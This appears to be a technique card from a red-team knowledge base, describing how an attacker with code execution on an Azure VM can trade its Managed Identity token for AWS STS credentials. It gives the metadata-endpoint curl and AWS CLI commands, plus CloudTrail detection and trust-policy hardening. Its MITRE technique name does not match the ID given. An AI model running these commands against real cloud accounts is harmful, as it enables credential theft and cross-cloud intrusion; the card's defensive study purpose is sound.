# [CA-TOKEN-019]: AWS STS Token Abuse via Azure

## Metadata
| Attribute | Details |
|---|---|
| **Technique ID** | CA-TOKEN-019 |
| **MITRE ATT&CK v18.1** | [Steal or Forge Authentication Certificates (T1528)](https://attack.mitre.org/techniques/T1528/) |
| **Tactic** | Credential Access |
| **Platforms** | Cross-Cloud (Azure -> AWS) |
| **Severity** | **High** |
| **Author** | SERVTEP (Pchelnikau Artur) |

## 2. EXECUTIVE SUMMARY
- **Concept:** The reverse of CA-TOKEN-018. If an Azure resource has a Managed Identity trusted by an AWS Role (via OIDC), an attacker compromising the Azure resource can request a token for the AWS audience (`api://aws...`), then exchange it for AWS STS Credentials (`sts:AssumeRoleWithWebIdentity`).
- **Attack Surface:** Azure Managed Identity.
- **Business Impact:** **Cross-Cloud Pivot**.

## 3. PREREQUISITES & CONFIGURATION
- **Required Privileges:** RCE on Azure VM.
- **Tools:** AWS CLI

## 4. ATTACK (Red Team Operations)

#### 4.1 Usage
**Step 1: Get Azure Token**
Get a token intended for the AWS audience.
```bash
TOKEN=$(curl "http://169.254.169.254/metadata/identity/oauth2/token?resource=api://aws.amazon.com/...")
```

**Step 2: Exchange for AWS Creds**
```bash
aws sts assume-role-with-web-identity --role-arn arn:aws:iam::123:role/AzureRole --web-identity-token $TOKEN
```

## 5. DETECTION (Blue Team Operations)

#### 5.1 AWS CloudTrail
| Source | Event | Filter Logic |
|---|---|---|
| **CloudTrail** | `AssumeRoleWithWebIdentity` | Source IP is an Azure datacenter IP. |

## 6. DEFENSE & REMEDIATION (Hardening)

#### 6.2 Immediate Remediation
*   **Trust Policy:** In the AWS Role Trust Policy, validate the `aud` (audience) and `sub` (subject) claims strictly against the Azure Managed Identity's Object ID.

## 7. ATTACK CHAIN
> **Preceding Technique:** [IA-CLOUD-003]
> **Next Logical Step:** [LAT-CLOUD-001]
